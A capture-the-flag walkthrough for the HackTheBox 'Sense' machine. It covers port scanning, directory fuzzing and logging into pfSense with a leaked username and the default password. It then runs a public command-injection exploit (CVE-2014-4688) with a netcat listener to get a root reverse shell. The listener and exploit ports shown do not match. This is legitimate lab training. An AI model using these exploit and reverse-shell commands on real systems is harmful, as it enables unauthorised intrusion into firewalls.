# Sense
**Machine ip:** 10.10.10.60

## Enumeration
+ `sudo masscan -p1-65535,U:1-65535 --rate=1000 10.10.10.60 -e tun0 > ports`
+ `ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')`
+ `sudo nmap -Pn -sV -sC -p$ports 10.10.10.60`

+ 2 ports are open which are 80 and 443:

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/6749553f-08d1-460f-aad6-1fbb09ae51ea)

+ Navigate to `https://10.10.10.60/`
+ pfsense login panel.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/d249333a-0934-4e18-a2ff-d8eeb457d36c)

+ Directory fuzzing:
```
gobuster dir -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.10.10.60/ -k -n -x html,php,txt -t 50
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/9a9704e1-f08a-4337-8340-8807b3a9efb4)

+ **system-users.txt** is interesting, and check it out.
+ Navigate to `https://10.10.10.60/system-users.txt`
```
####Support ticket###

Please create the following user


username: Rohit
password: company defaults
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/6601d0fd-d8aa-440c-b85e-eb1598afba6e)

+ Login [pfsense](https://docs.netgate.com/pfsense/en/latest/usermanager/defaults.html) using credentials `rohit`:`pfsense`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/97eb08bc-2825-44a1-a5ba-897c186d2689)

+ `searchsploit pfsense`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/d1945b44-4ad0-402f-add2-f2206ebf4ad8)

+ pfSense < 2.1.4 - 'status_rrd_graph_img.php' Command Injection: [CVE-2014-4688 ](https://www.exploit-db.com/exploits/43560)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/ff6726fb-505d-4fd4-90a8-460f9d7a5549)

+ `searchsploit -m 43560`
+ Start listener: `nc -lnvp 4444`
+ `python3 43560.py --rhost 10.10.10.60 --lhost 10.10.14.7 --lport 5555 --username rohit --password pfsense`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/d6f35b34-e308-432b-8f48-3756e6010eba)

+ Get root shell.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/35e0d755-020d-4e1f-92e6-e8405893a3c0)



# References & Alternatives:
+ https://vvmlist.github.io/#sense
+ https://0xdf.gitlab.io/2021/03/11/htb-sense.html
